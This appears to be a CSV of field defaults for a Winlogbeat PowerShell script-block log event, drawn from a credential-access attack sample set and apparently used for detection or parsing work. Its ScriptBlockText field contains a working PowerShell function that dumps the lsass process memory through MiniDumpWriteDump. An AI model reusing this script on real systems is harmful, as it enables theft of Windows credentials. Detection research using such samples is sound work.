key,default_value
@timestamp,"%Y-%m-%dT%H:%M:%S.000Z"
@metadata_beat,"winlogbeat"
@metadata_type,"_doc"
@metadata_version,"7.9.3"
agent_version,"7.9.3"
agent_hostname,"WIN-1234"
agent_ephemeral_id,46610f5d-2acc-4dfc-bcad-d740bc9aa5f2
agent_id,46610f5d-2acc-4dfc-bcad-d740bc9aa5f2
agent_name,"WIN-1234"
agent_type,"winlogbeat"
winlog_record_id,"971"
winlog_event_id,"4104"
winlog_provider_guid,"{46610f5d-2acc-4dfc-bcad-d740bc9aa5f2}"
winlog_api,"wineventlog"
winlog_channel,"Microsoft-Windows-PowerShell/Operational"
winlog_activity_id,"{46610f5d-2acc-4dfc-bcad-d740bc9aa5f2}"
winlog_process_pid,"7008"
winlog_process_thread_id,"6488"
winlog_opcode,"On create calls"
winlog_version,"1"
winlog_user_identifier,"S-1-5-21-3123456602-4012345619-1234580069-1000"
winlog_computer_name,"MSEDGEWIN10"
winlog_task,"Execute a Remote Command"
winlog_event_data_ScriptBlockText,"function Memory($path)\n{\n\t\t\t  \n\t\t\t  \n\t\t$Process = Get-Process lsass\n\t\t$DumpFilePath = $path\n\t\t\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\n\t\n\t\t\t\n\t\t\t  #\n\t\t$ProcessId = $Process.Id\n\t\t$ProcessName = $Process.Name\n\t\t$ProcessHandle = $Process.Handle\n\t\t$ProcessFileName = $($ProcessName).dmp\n\t\t\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n\t\t\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n\t\t\t  \n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\n\t\t\t  \n\t\t$FileStream.Close()\n\t\t\n\t\tif (-not $Result)\n\t\t{\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\n\t\t\t$ExceptionMessage = $($Exception.Message) ($($ProcessName):$($ProcessId))\n\t\t\t\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\n\t\t\t\n\t\t\tthrow $ExceptionMessage\n\t\t}\n\t\telse\n\t\t{\n\t\t\tMemdump complete!\n\t\t}\n\t\n}"
winlog_event_data_ScriptBlockId,"46610f5d-2acc-4dfc-bcad-d740bc9aa5f2"
winlog_event_data_Path,"C:\\Users\\Public\\execps.ps1"
winlog_event_data_MessageNumber,"1"
winlog_event_data_MessageTotal,"1"
winlog_provider_name,"Microsoft-Windows-PowerShell"
event_created,"%Y-%m-%dT%H:%M:%S.000Z"
event_kind,"event"
event_code,"4104"
event_provider,"Microsoft-Windows-PowerShell"
event_action,"Execute a Remote Command"
host_name,"MSEDGEWIN10"
log_file_path,"C:\\scratch\\attacks\\EVTX-ATTACK-SAMPLES\\Credential Access\\Powershell_4104_Dump.evtx"
log_level,"warning"
message,"Creating Scriptblock text (1 of 1)"
ecs_version,"1.5.0"
